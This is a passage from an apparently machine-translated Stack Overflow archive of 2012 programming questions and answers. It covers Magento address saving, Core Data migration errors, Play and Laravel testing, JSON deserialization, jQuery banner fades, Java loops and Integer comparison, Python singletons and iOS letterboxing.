    [_eventPrefix:protected] => customer_address
    [_eventObject:protected] => customer_address
    [_resourceName:protected] => customer/address
    [_resource:protected] => 
    [_resourceCollectionName:protected] => customer/address_collection
    [_cacheTag:protected] => 
    [_dataSaveAllowed:protected] => 1
    [_isObjectNew:protected] => 
    [_data:protected] => Array
        (
            [entity_type_id] => 2
            [entity_id] => 
            [is_default_billing] => 1
            [is_default_shipping] => 1
            [firstname] => Chirp  // customer firstname
            [lastname] => Anaplex // customer lastname
            [company] => some agency
            [street] => 2345 somewhere dr
            [city] => somecity
            [country_id] => US
            [region] => 
            [region_id] => 44
            [postcode] => 84151
            [telephone] => 123-123-1233
        )

    [_hasDataChanges:protected] => 1
    [_origData:protected] => 
    [_idFieldName:protected] => entity_id
    [_isDeleted:protected] => 
    [_oldFieldsMap:protected] => Array
        (
        )

    [_syncFieldsMap:protected] => Array
        (
        )

) 
```

表单变量已成功传递（我在日志中看到它们），但我似乎无法以这种方式将它们插入地址对象。我收到以下通知：

```
2012-12-18T16:39:39+00:00 ERR (3): Notice: Indirect modification of overloaded element of Mage_Customer_Model_Address has no effect  in /root/namespace/module/controllers/AccountController.php on line 79 
```

如果这是“间接” - 什么是“直接”方法？

任何人？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T16:54:20.117

德普。这行得通。

```
$address->setData('firstname', $this->getRequest()->getPost('billing_firstname'));
$address->setData('lastname', $this->getRequest()->getPost('billing_lastname'));
$address->setData('fax', $this->getRequest()->getPost('billing_fax')); 
```

还有人需要这个吗？

将表单字段添加到`your/theme/template/persistent/forms/register.phtml`
覆盖`Mage_Customer_AccountController`
`setData('key', 'value')`中`yourmodule/customer/controller/accountController.php :: createPostAction()`

# objective-c - 处理 addPersistentStoreWithType 中的错误

> ID：13806849
> 
> 赞同：6
> 
> 时间：2012-12-10T18:22:10.993
> 
> 标签：objective-c, core-data, fatal-error

我正在尝试查找有关在 iPhone 上创建持久存储协调器时处理错误的信息。我已经实现了轻量级迁移

```
 NSError *error = nil;
NSDictionary *options = [NSDictionary dictionaryWithObjectsAndKeys:
                         [NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption,
                         [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];
_persistentStoreCoordinator = [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:[self managedObjectModel]];
if (![_persistentStoreCoordinator addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeURL options:options error:&error]) {
    /*
     Replace this implementation with code to handle the error appropriately.

     abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 

     Typical reasons for an error here include:
     * The persistent store is not accessible;
     * The schema for the persistent store is incompatible with current managed object model.
     Check the error message to determine what the actual problem was.

     If the persistent store is not accessible, there is typically something wrong with the file path. Often, a file URL is pointing into the application's resources directory instead of a writeable directory.

     If you encounter schema incompatibility errors during development, you can reduce their frequency by:
     * Simply deleting the existing store:
     [[NSFileManager defaultManager] removeItemAtURL:storeURL error:nil]

     * Performing automatic lightweight migration by passing the following dictionary as the options parameter:
     @{NSMigratePersistentStoresAutomaticallyOption:@YES, NSInferMappingModelAutomaticallyOption:@YES}

     Lightweight migration will only work for a limited set of schema changes; consult "Core Data Model Versioning and Data Migration Programming Guide" for details.

     */
    NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
    abort();
}    

return _persistentStoreCoordinator; 
```

这是基于 Apple 的代码，并增加了对轻量级迁移的支持。

如果应用程序在这里仍然会遇到错误，我找不到任何有关处理错误的信息。在我看来，如果无法创建数据库，则根本无法使用应用程序。

*   我是否只是要求用户尝试重新安装应用程序并显示相关信息？
*   我可以在添加有关错误的提示时保留 abort() 语句，否则会导致应用程序被 Apple 拒绝吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-10T19:22:40.313

Calling abort() in this situation is out of question. Any app that crashes will be rejected by Apple. And it does not solve the problem: Starting the app again will find the same store file and therefore fail again.

For the same reason, reinstalling the app does not help, and it would be a bad user experience.

Of course, the situation should not occur if the migration has been tested. But if this fatal error occurs and your app cannot open the database, you have to create a fresh database.

The exact steps to take depend on what is stored in the database and if/how you can recover the data. So you could

*   remove the old database file with `[[NSFileManager defaultManager] removeItemAtURL:storeURL error:nil]`, or copy a default database file from your programs resources to `storeURL`,
*   call `_persistentStoreCoordinator addPersistentStoreWithType:...` again to open the new database.
*   perhaps fill the database again with data from a server, or whatever has to be done to recreate the data.

# scala - 发现“play.api.libs.iteratee.Iteratee[Array[Byte],play.api.mvc.Result]”需要“play.api.mvc.Result”错误

> ID：13806851
> 
> 赞同：4
> 
> 时间：2012-12-10T18:22:13.880
> 
> 标签：scala, playframework, playframework-2.0

使用 Play 2.1-RC1 我无法编写简单的测试。

这是操作代码：

```
def echoTestTagFromXml = Action(parse.xml) { request =>
    (request.body \ "test" headOption).map(_.text).map { test =>
        Ok(views.xml.testTag(test))
    }.getOrElse {
      BadRequest("Missing parameter [name]")
    }
} 
```

这是测试代码：

```
"Test Tag Xml Echo" in {
    running(FakeApplication()) {
      val req = new FakeRequest(POST, controllers.routes.SimpleResultsController.echoTestTagFromXml().url, FakeHeaders(), Xml("<test>gg</test>"))        
      val result = controllers.SimpleResultsController.echoTestTagFromXml()(req)
      status(result) must equalTo(OK)
    }
} 
```

测试给出错误：

```
[error]  found   : play.api.libs.iteratee.Iteratee[Array[Byte],play.api.mvc.Result]
[error]  required: play.api.mvc.Result 
```

从谷歌我知道问题出在 BodyParser 中。但我不知道（在 API 调查之后）如何使代码工作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-11T23:15:51.710

以下修改后的测试代码*应该可以*工作，但我认为目前在尝试将主体传递到 FakeRequest 时存在一个错误，这在某种程度上是功能测试现已弃用的“routeAndCall”函数的宿醉。身体永远是空的。

```
"Test Tag Xml Echo" in {
  running(FakeApplication()) {
    val req = FakeRequest(POST, controllers.routes.SimpleResultsController.echoTestTagFromXml().url, FakeHeaders(), Xml("<test>gg</test>"))
      .withHeaders(CONTENT_TYPE -> "text/xml")
    val result = await(controllers.SimpleResultsController.echoTestTagFromXml()(req).run)
    contentAsString(result) must equalTo("gg")
    status(result) must equalTo(OK)
  }
} 
```

我在将 Json 传递到正文时遇到了类似的问题，但试图让它为您的正文解析器工作（注意差异）。另外，请设置内容类型标题。

但是，您可以改用“路由”功能：

```
"Test Tag Xml Echo Route" in {
  running(FakeApplication()) {
    val result = route(FakeRequest(POST, "/SimpleResultsController").withHeaders(CONTENT_TYPE -> "text/xml"), Xml("<test>gg</test>")).get
    contentAsString(result) must equalTo("gg")
    status(result) must equalTo(OK)
  }
} 
```

这似乎对我有用，您应该能够复制/粘贴此解决方案。

如果您不想将路线重复为字符串，则可以像以前一样使用反向路线：`controllers.routes.SimpleResultsController.echoTestTagFromXml().url`

# php - Laravel 4 在控制器中注入 Eloquent 模型

> ID：13806852
> 
> 赞同：3
> 
> 时间：2012-12-10T18:22:23.810
> 
> 标签：php, laravel, eloquent

我对 DI 和 IoC 的这个概念很陌生，所以我可能做错了，但我试图将与控制器匹配的模型注入到控制器构造函数（UserModel -> UsersController）中，以便我以后可以模拟它。

所以我的模型看起来像：

```
use Illuminate\Auth\UserInterface;

class User extends Eloquent implements UserInterface {

    public function getAuthIdentifier()
    {
        return $this->getKey();
    }

    public function getAuthPassword()
    {
        return $this->password;
    }

} 
```

然后我试图像这样注入UsersController：

```
class UsersController extends Controller {

    protected $user;

    public function __construct(User $user)
    {
        $this->user = $user;
    }

    public function index()
    {
        //dd( $this->user);
        $users = $this->user->all();
        foreach ( $users as $user ) 
            print_r($user);
        return;
    }

} 
```

然后，当我在浏览器中点击此控制器时，我收到“无法解析的依赖解析”错误。

我注意到只有当我尝试注入的类是 eloquent 的子类时才会发生这种情况，如果我尝试使用不扩展 eloquent 的自定义类的相同代码，那么它可以正常工作。

我错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T22:50:39.430

除了评论，我终于知道这是一个复杂的问题。要绕过这一点，您需要将模型与 IoC 绑定并手动返回模型的新实例。

```
App::bind('User', function()
{
    return new User;
}); 
```

# c# - 反序列化 GET 响应

> ID：13806854
> 
> 赞同：0
> 
> 时间：2012-12-10T18:22:32.823
> 
> 标签：c#, json

如何反序列化此文本。我尝试使用 JSON，但出现“无效 JSON 原语”错误。

```
{
"meta": {
  "limit": 20,
  "next": null,
  "offset": 0,
  "previous": null,
  "total_count": 1
},
"objects": [
  {
     "blocked": false,
     "groups": [],
     "id": "1111",
     "name": "John Doe",
     "number": "+15555555555",
     "resource_uri": "/api/v1/contacts/1111/"
  }
 ]
} 
```

这是我使用的代码：

```
var jss = new JavaScriptSerializer();
var dictionary = jss.Deserialize<Dictionary<string, string>>(buffer.ToString()); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:27:08.100

易于修复。反序列`<Dictionary<string, object>`化为`<Dictionary<string, string>`

```
var dictionary = jss.Deserialize<Dictionary<string, object>>(buffer.ToString()); 
```

完整的测试代码

```
string json = @"{
    ""meta"": {
        ""limit"": 20,
        ""next"": null,
        ""offset"": 0,
        ""previous"": null,
        ""total_count"": 1
    },
    ""objects"": [
        {
            ""blocked"": false,
            ""groups"": [],
            ""id"": ""1111"",
            ""name"": ""John Doe"",
            ""number"": ""+15555555555"",
            ""resource_uri"": ""/api/v1/contacts/1111/""
        }
        ]
    }";

var jss = new JavaScriptSerializer();
var dictionary = jss.Deserialize<Dictionary<string, object>>(json); 
```

# jquery - 堆叠元素之间的淡入淡出

> ID：13806855
> 
> 赞同：0
> 
> 时间：2012-12-10T18:22:44.753
> 
> 标签：jquery, slideshow, fadein

所以我有三个堆叠的元素，即

标记：

```
<div id="banner-1" class="banner-background"></div>
<div id="banner-2" class="banner-background"></div>
<div id="banner-3" class="banner-background"></div>

<a class="menu-link banner-1-link">1</a>
<a class="menu-link banner-2-link">2</a>
<a class="menu-link banner-3-link">3</a> 
```

jQuery：

对于每个链接，我想切换到相应的元素并淡入淡出。然而，这导致了奇怪的问题，第三个元素一直在淡入淡出。还有更好的方法来解决这个问题，这样更有活力，所以说如果我想添加 4 或 5 它也可以吗？

```
 $('.menu-link').on('mouseenter', function(){
        var menuLink = $(this);

        if (menuLink.hasClass('banner-1-link')){
            $('#banner-1').animate({'opacity': 0}, 100, function (){
                $('#banner-1').css('z-index', '3');
            }).animate({'opacity': 1}, 600);
                $('#banner-2').css('z-index', '0');
                $('#banner-3').css('z-index', '0');
        }

        else if (menuLink.hasClass('banner-2-link')){
            $('#banner-2').animate({'opacity': 0}, 100, function (){
                $('#banner-2').css('z-index', '3');
            }).animate({'opacity': 1}, 600);
                $('#banner-3').css('z-index', '0');
                $('#banner-1').css('z-index', '0');
        }

        else {
            $('#banner-3').animate({'opacity': 0}, 100, function (){
                $('#banner-3').css('z-index', '3');
            }).animate({'opacity': 1}, 600);
                $('#banner-2').css('z-index', '0');
                $('#banner-1').css('z-index', '0');
        }
}); 
```

任何帮助表示赞赏，谢谢！

编辑：

CSS：

```
.banner-background{
    width: 100%;
    height: 500px;
    position: absolute;
    top: 0;
    left: 0;
}

#banner-1{
    z-index: 3;
}

#banner-2{
    z-index: 0;
}

#banner-3{
    z-index: 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T12:27:43.653

```
 $('.menu-link').on('mouseenter', function(){

                      var $menuLink = $(this);
                      var $banner = $('#' + $menuLink.data('banner'));

                        $banner.css('opacity', 0);
                        $banner.parent().append($banner);

                        // fade in relevant banner
                        $banner.animate({'opacity': 0}, 100, function (){
                        }).animate({'opacity': 1}, 600);
    }); 
```

我需要附加图像。因此，我们获取每个图像，并将其附加到父容器中。

```
<div class="banner-back-container">
     <div class="banner-background" id="banner-1"></div>
      <div class="banner-background" id="banner-2"></div>
      <div class="banner-background" id="banner-3"></div>
 </div>

<li><a href="#" class="active menu-link" data-banner="banner-1">Latest collection</a></li>
<li><a href="#" class="menu-link" data-banner="banner-2">Must have collection</a></li>
<li><a href="#" class="menu-link" data-banner="banner-3">Coming soon</a></li> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:33:37.567

您可以使用`data`attr。

HTML

```
<div id="banner-1" class="banner-background"></div>
<div id="banner-2" class="banner-background"></div>
<div id="banner-3" class="banner-background"></div>

<a class="menu-link banner-1-link" data-banner="banner-1">1</a>
<a class="menu-link banner-2-link" data-banner="banner-2">2</a>
<a class="menu-link banner-3-link" data-banner="banner-3">3</a> 
```

JS

```
$('.menu-link').on('mouseenter', function(){
    var $menuLink = $(this),
        $banner = $('#' + $menuLink.data('banner'));

    $banner.animate({'opacity': 1}, 100, function (){
        $(this).css('z-index', '3');
    });
    $('.banner-background').not($banner).css('z-index', '0');

}); 
```

[**演示**](http://jsfiddle.net/rn686/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:34:52.020

这可能是您需要的 - 将所有横幅淡出，然后根据需要更改 z-index，然后再将它们全部淡入：

```
$('.menu-link').on('mouseenter', function() {
    var menuLink = $(this);
    $banners = $('#banner-1,#banner-2,#banner-3');

    $banners.stop().animate({'opacity':0},100, function() {
        $banners.css({'z-index':0});
        if (menuLink.hasClass('banner-1-link')) {
            $('#banner-1').css({'z-index':3});
        } else if (menuLink.hasClass('banner-2-link')) {
            $('#banner-2').css({'z-index':3});
        } else if (menuLink.hasClass('banner-3-link')) {
            $('#banner-3').css({'z-index':3});
        };
        $banners.animate({'opacity':1},600);
    });
});​ 
```

[http://jsfiddle.net/mblase75/GbbVU/](http://jsfiddle.net/mblase75/GbbVU/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:43:28.543

这是我的 jsfiddle：http: [//jsfiddle.net/Morlock0821/k4EkG/1/](http://jsfiddle.net/Morlock0821/k4EkG/1/)

html

```
<div class="banner" id="banner-1"></div>
<div class="banner" id="banner-2"></div>
<div class="banner" id="banner-3"></div>
<a data-banner="1" class="menu-link">1</a>
<a data-banner="2" class="menu-link">2</a>
<a data-banner="3" class="menu-link">3</a>​ 
```

js

```
$('.menu-link').on('mouseenter', function(){
    var menuLink = $(this),
        banner = menuLink.data('banner');

    $('.banner').not(this).animate({'opacity': 0}, 100);
    $('#banner-' + banner).animate({'opacity': 1}, 600);

});​ 
```

css

```
.banner {
    position:absolute;
    top:0;
    left:0;
    width:100%;
    height:40px;
}
#banner-1 {
    background-color:blue;
}
#banner-2 {
    background-color:red;
    opacity:0;
}
#banner-3 {
    background-color:green;
    opacity:0;
} 
```

using`data`是去这里的方式，以便它是动态的。

# xml - 为未知深度构造 xml

> ID：13806856
> 
> 赞同：1
> 
> 时间：2012-12-10T18:22:45.930
> 
> 标签：xml, tsql

我有一列的值如下：

```
/root,
/root/first,
/root/first/one, 
```

我不知道 xml 路径的深度。我需要构建一个像

```
<root>
    <first>
        <one></one>
    </first>
</root> 
```

将所有子元素分组到其父母的任何 tsql 帮助都会有所帮助，谢谢

# python - 使用 MacPorts Python 安装 PRAW

> ID：13806861
> 
> 赞同：0
> 
> 时间：2012-12-10T18:22:56.797
> 
> 标签：python, macports, reddit

### 问题

如何使用 MacPorts 版本的 python安装[PRAW ？](https://github.com/praw-dev/praw/wiki)

它似乎没有端口。

### 我试过的

我发现最接近这个问题的是：[MacPorts manual port location](https://stackoverflow.com/questions/2566357/macports-manual-port-location)，所以我试图为它制作自己的端口，但我真的不知道我在做什么。

我知道我可以`pip`为非 MacPorts 版本的 Python 安装它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T19:05:42.953

这不需要特定于平台的 PRAW 版本。使用`pip`or`easy_install`是获取最新 python 包的推荐方法，如[PyPI](http://pypi.python.org/pypi)（Python 包索引）是 python 包，MacPorts（或 Brew、Fink 等）是 OSX 特定包。

作为 PRAW 包的维护者，我希望您不要创建特定于平台的包，因为它们是不必要的，更重要的是因为它们很快就会过时。

如果您担心系统 python 的命名空间混乱，那么我建议您使用[virtualenv](http://pypi.python.org/pypi/virtualenv)，如果您使用的是 python 3.3，则建议您使用内置的虚拟环境功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T20:34:23.743

所以事实证明，我是一个不明白 macports 也可以安装自己的版本的白痴`pip`。以下是我最终让 PRAW 工作的方式：

```
sudo port install py27-pip
sudo pip-2.7 install praw 
```

我真的需要弄清楚这个 virtualenv 的东西......

# java - Java平台库Hashcode

> ID：13806864
> 
> 赞同：5
> 
> 时间：2012-12-10T18:23:09.563
> 
> 标签：java, hashcode

在 Effective Java Item 9 (Always override `hashCode`when you override `equals`) 中说

> Java 平台库中的许多类，例如 String、Integer 和 Date，在它们的规范中包含由它们的 hashCode 方法返回的确切值作为实例值的函数。这通常不是一个好主意，因为它严重限制了您在未来版本中改进散列函数的能力。

这是什么意思 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:25:13.187

这意味着您无法在更高版本的代码中重写散列函数以获得更好的散列属性。例如，`String.hashCode()`功能很快……但不是很好。但它不能再改变了，因为哈希码是指定的，人们已经在他们自己的代码中依赖于那个实现。

# javascript - Javascript 实时代码修改

> ID：13806871
> 
> 赞同：0
> 
> 时间：2012-12-10T18:23:42.263
> 
> 标签：javascript, debugging, live

我是 javascript 新手，我想问一下是否有任何方法可以修改从服务器端加载的 javascript 代码？有一个外部脚本`<script src="myscripts.js"></script>` 我可以修改它吗，比如说使用 Google Chrome 检查器。例如，我想更改脚本的功能之一。我可以做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T00:25:14.917

是的你可以。

但是，如果您刷新（或再次请求脚本），您将从服务器获取原始脚本。

* * *

## 回答 #2

> 赞同：-4
> 
> 时间：2012-12-10T18:35:34.773

无法在客户端上修改 JavaScript。如果可以的话，想想这将造成的破坏。

# java - Infinite Loop Java

> ID：13806880
> 
> 赞同：2
> 
> 时间：2012-12-10T18:24:07.963
> 
> 标签：java, loops, input, infinite

First of all this is a homework problem. I finished the program, and it runs fine; but I have a little side problem. The program is supposed to first read a txt file online, and gather all 50 states and their abbreviations. Next, I have to ask the user to enter in a valid state abbreviation. Once they do that, I have to read another txt file online, and return the two senators for their state.

The problem I'm having is that I want to loop the scanner asking the user to enter a state. If they enter an incorrect state, then I want to re-ask them. Right now, if I enter in a legit state, the program works fine. If I enter in an incorrect state, the program loops, and re-asks me to enter in another state. If I enter in an incorrect state, and then enter in a correct state, the program asks me to enter in another state, rather than continuing with the program. Any help please?

I think the problem is that when the program loops, it doesn't read:

```
if(stateAbbreviation.equals(abbreviation))
{
  state = splitData[0];
  abbrev = stateAbbreviation;
  found = true;
  break;
} 
```

Again, making found always = false.

```
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;

public class Senator
{
  static String abbrev; 
  static String state;

  public static void main(String[] args) throws IOException
  {
    // define our URL
    URL serviceURL = new URL("http://i5.nyu.edu/~cmk380/cs101/USStates.txt");

    // connect and obtain data from this URL
    Scanner input = new Scanner( serviceURL.openStream() );
    Scanner input1 = new Scanner(System.in);

    while(true)
    {
      boolean found = false;

      //Ask for state
      System.out.print("Enter state (abbreviation): ");
      String stateAbbreviation = input1.next();

      // read in our data
      while ( input.hasNext() )
      {
        // grab a line
        String data = input.nextLine();

        // split up the line based on the position of the commas
        String[] splitData = data.split(",");

        // grab out the abbreviation
        String abbreviation = splitData[1];  

        if(stateAbbreviation.equals(abbreviation))
        {
          state = splitData[0];
          abbrev = stateAbbreviation;
          found = true;
          break;
        }
      } 

      if (found == true)
      {
        // close our URL
        input.close();
        break;
      }
    }

    double numLines = 0;    

    // define our URL
    URL senatorURL = new URL("http://www.contactingthecongress.org/downloadsContactingCongress.db.txt");

    // connect and obtain data from this URL
    Scanner input2 = new Scanner( senatorURL.openStream() );

    // read in our data
    while ( input2.hasNext() )
    {
      // grab a line
      String data = input2.nextLine();

      if (numLines != 0)
      {
        // split up the line based on the position of the commas
        String[] splitData = data.split("\t");

        if(splitData[0].equals(abbrev+"SR"))
        {
          System.out.println("");
          System.out.println("State: " + state);
          System.out.println("");
          System.out.println("Senior Senator");
          System.out.println("Name: " + splitData[1]);

          //Try catch their information (exception raised if not found)
          try
          {
            System.out.println("Address: " + splitData[3]);
          }
          catch (Exception e)
          {
            System.out.println("Addrress unavailable.");
          }

          try
          {
            System.out.println("Phone: " + splitData[4]);
          }
          catch (Exception e)
          {
            System.out.println("Phone unavailable.");
          }

          try
          {
             System.out.println("Website: " + splitData[7]);
          }
          catch (Exception e)
          {
            System.out.println("Website unavailable.");
          }
          System.out.println("");
        }           

        if(splitData[0].equals(abbrev+"JR"))
        {
          System.out.println("Junior Senator");
          System.out.println("Name: " + splitData[1]);

          //Try catch their information (exception raised if not found)
          try
          {
            System.out.println("Address: " + splitData[3]);
          }
          catch (Exception e)
          {
            System.out.println("Addrress unavailable.");
          }

          try
          {
            System.out.println("Phone: " + splitData[4]);
          }
          catch (Exception e)
          {
            System.out.println("Phone unavailable.");
          }

          try
          {
            System.out.println("Website: " + splitData[7]);
          }
          catch (Exception e)
          {
            System.out.println("Website unavailable.");
          }
          System.out.println("");
        }

      }

      numLines ++; 
    }

    // close our URL
    input2.close();
  }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:56:29.200

You have two `while` and then you try to use a break to get out of it, but you're just getting out of the inner `while`.

To get out of both `while`s, you need to change your program logic or use labels (yes, Java can use labels, and to break from an inner loop and of the outter loop at once is one of it's uses)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:59:21.907

Another way you can do this is

```
 public static boolean checkAbbreive(){
              while(true)
                {
                    boolean found = false;

                    //Ask for state
                    System.out.print("Enter state (abbreviation): ");
                    String stateAbbreviation = input1.next();

                    // read in our data
                    while ( input.hasNext() )
                    {
                        // grab a line
                        String data = input.nextLine();

                        // split up the line based on the position of the commas
                        String[] splitData = data.split(",");

                        // grab out the abbreviation
                        String abbreviation = splitData[1];  

                        if(stateAbbreviation.equals(abbreviation))
                        {
                            state = splitData[0];
                            abbrev = stateAbbreviation;
                            found = true;
                            return found;
                        }

               }
         if (checkAbbreive() == true)
            {
            // close our URL
            input.close();
            break;
            }

    }
} 
```

Notice both while loops are encased in a function and there is a return found command after found = true

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:59:58.367

I'm not sure, if this will work, but try to break out of both loops.

```
breakTheWholeWhileLoop:
while(true)
{
   //For this version, we won't need the boolean found 
   //since we'll break out of everything

   //Ask for state
   System.out.print("Enter state (abbreviation): ");
   String stateAbbreviation = input1.next();

   //Read in our data
   while(input.hasNextLine() )
   {
      //...

      if(stateAbbreviation.equals(abbreviation) )
      {
         state = splitData[0];
         abbrev = stateAbbreviation;
         input.close();

         //This piece of code will break out of the while(true) loop
         break breakTheWholeWhileLoop;
      }
   } //while input loop
} //while true loop

//Do the rest 
```

Hopefully that'll help.

# java - 我怎样才能在java中获得真正的逻辑条件为真

> ID：13806883
> 
> 赞同：-2
> 
> 时间：2012-12-10T18:24:10.517
> 
> 标签：java, loops, while-loop, logic

那是我的while循环，问题是，我怎样才能得到一个真实的条件？

`s`并且`t`是`Integer`变量

```
while (s<=t && s>=t && s!=t ) 
```

**编辑**

**tl;博士**原来的问题说：

`s`并且`t`是`int`变量*（并且OP评论说它们不是`Integer`变量）*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:25:21.487

绝不！ `s`和`t`是`int`变量，所以当`s == t`第三个操作数失败时`s != t`，前两个操作数之一将失败。

如果将它们声明为`volatile int s, t;`在多线程应用程序中，则可能，但不太可能。

**编辑**

问题已修改。Now`s`和`t`是整数变量，这使得引用`Integer`对象的答案更加相关。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:31:45.647

通过在对象中装箱原始值：

```
 Integer s = new Integer(5);
    Integer t = new Integer(5);

    boolean rslt = (s <= t && s >= t && s !=  t);

    System.out.println("Result = " + rslt); 
```

这里的`rslt`布尔值确实会评估为`true`。

但是，以下将返回 false：

```
s <= t && s >= t && !s.equals(t) 
```

这是因为在 Java 中，对于对象，`==`意味着它确实是同一个实例，而`equals`由每个类实现，通常意味着比较对象的核心值是相同的——但不一定相同类实例（AKA 对象）。`> and <`盒装原语是根据原语值评估的，但是正在`==`检查对象身份。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T18:35:52.760

实际上是可能的：

```
public class EqualsTest
{
    public static void main(String[] args)
    {
        Integer x = new Integer(Integer.parseInt(args[0]));
        Integer y = new Integer(Integer.parseInt(args[1]));

        if(x <= y && y <= x && y !=x)
        {
            System.out.println("equal");
        }
        else
        {
            System.out.println("not equal");
        }
    }
} 
```

编译它并使用两个相等的整数参数运行它会产生：

```
$ java EqualsTest 5 5
equal 
```

这个工作的原因是由于[自动装箱](http://docs.oracle.com/javase/1.5.0/docs/guide/language/autoboxing.html)和事实，对于对象，`==`只检查引用是否相同（在上面的例子中，它们不是）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:26:37.130

从来没有人，没有办法。

s<=t && s>=t 如果 s == t 则返回 true，并且 s == t && s != t 永远返回 false。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-10T18:28:50.787

前两个条件结果为真的唯一方法是当 s 等于 t 而第三个条件否定这个事实。

因此我认为不可能

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-10T18:40:31.153

如果这两个值可以被多个线程访问（或者`static`多个线程之间共享的对象的成员变量），你可以这样做：

线程 1：

```
s = 1; // 1
t = 1; // 2
t = 2; // 5 
```

线程 2：

这相当于你的表达，但更容易标记。

```
boolean result = s <= t; // 3
if(result) {
    result = s >= t; // 4
}
if(result) {
    result = s != t; // 6
} 
```

假设一切都按照注释数字给出的顺序发生，那么在线程 2 的代码结束时，`result`将是真的。

因此，线程 1 设置`s`和`t`相等，然后线程 2 检查它们是否相等，然后线程 1 将它们设置为不相等，然后线程 2 检查它们不相等。

在更复杂的情况下，这可能是正确的，但这是我能想到的最简单的情况。

# python - Python代码：仅初始化一个类的一个实例

> ID：13806884
> 
> 赞同：0
> 
> 时间：2012-12-10T18:24:11.757
> 
> 标签：python, singleton, single-instance

对不起新手程序员关于一次只运行一个类的一个实例的问题；现在正在努力寻找构建代码的正确方法。

我已经研究过但很难找到正确的方法，但是关于正确的pythonic方法的很多争论是模块或Singltons，例如[确保只运行一个类的一个实例](https://stackoverflow.com/questions/1575680/ensure-that-only-one-instance-of-a-class-gets-run)

我有一些代码（python 2.7.2）不断记录 3 个变量（2 个温度和一个压力传感器），然后根据一些查看变量趋势的逻辑，移动一个阀门（如果语句为真，则在有很多全局变量的模块，因为我实际上希望我的所有定义都查看相同的数据集并移动相同的阀门）。目前，这一切在模块文件中都可以正常工作。

但是，为了让实验室中的其他人可以运行我的代码，它需要从通用 GUI 启动，因此我的代码需要线程化，以便该过程不会占用 GUI 和命令行。

我已经开始将代码重写到一个类（带有线程超类）中，并想添加一些逻辑，即只调用了该类的一个实例，这样 >1 线程就不会试图控制同一个阀门.

现在，我发现这在 python 中并不容易，并且读到“单例”的概念很糟糕，并且正在努力寻找如何构建我的代码的解决方案。

如果有人能指出我正确的方向，我将不胜感激，因为我想这一定已经得到了回答。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-09T04:52:46.723

您应该初始化一个实例并仅访问您初始化的常量，为了安全起见，如果有人试图创建另一个实例，请引发异常

```
class Singletone(object):
    __initialized = False
    def __init__(self):
        if Singletone.__initialized:
            raise Exception("You can't create more than 1 instance of Singletone")
        Singletone.__initialized = True

MY_SINGLETONE_INSTANCE = Singletone() 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-10T18:48:24.433

来自[http://norvig.com/python-iaq.html](http://norvig.com/python-iaq.html)：

```
def singleton(object, instantiated=[]):
    "Raise an exception if an object of this class has been instantiated before."
    assert object.__class__ not in instantiated, \
        "%s is a Singleton class but is already instantiated" % object.__class__
    instantiated.append(object.__class__)

class YourClass:
    "A singleton class to do something ..."
    def __init__(self, args):
        singleton(self)
        ... 
```

不过，不确定您必须如何适应多线程应用程序。

# ios - 如何在不删除应用程序的情况下使用 iPhone 5 和 Xcode 4.5.2 重新启用信箱模式？

> ID：13806888
> 
> 赞同：-2
> 
> 时间：2012-12-10T18:24:27.620
> 
> 标签：ios, xcode4.5, iphone-5

我想在 iPhone 5 上为我的应用重新启用信箱模式。使用 Xcode 4.5.2 并为 iPhone 5 构建一个应用程序，我生成了一个 1136x640 的启动图像，它被命名为 Default-568h@2x.png。我已经删除了启动屏幕，在项目摘要中，该图像的空间是空的。此外，我已经删除了在项目文件夹中找到的所有实例。但是，我的应用程序继续在 iPhone 5 上全屏显示，我想要的是能够再次使用信箱模式。我相信这可以通过删除应用程序来实现，但是如何在不从手机中删除应用程序的情况下使用 iPhone 5 和 Xcode 4.5.2 重新启用信箱模式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:31:20.657

在 Xcode 中点击“产品”->“清洁”，然后从手机中删除该应用程序。然后重建您的项目，任何地方都不应该有任何 Default-568h@2x.png 的缓存版本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:29:58.407

您是否尝试过从设备中删除应用程序并重新部署它？除非删除并重新部署应用程序，否则我遇到了图标文件等未刷新的问题。

或者，您可以连接您的 iPhone 并打开管理器。选择设备和应用程序，然后点击“下载”。

然后将您刚刚保存的存档添加回您的项目。然后转到项目方案下拉编辑方案>运行并选择应用程序数据包。

从头开始重新部署您的应用程序，它将包含已保存的状态。

* * *

## 回答 #3

> 赞同：0
> 
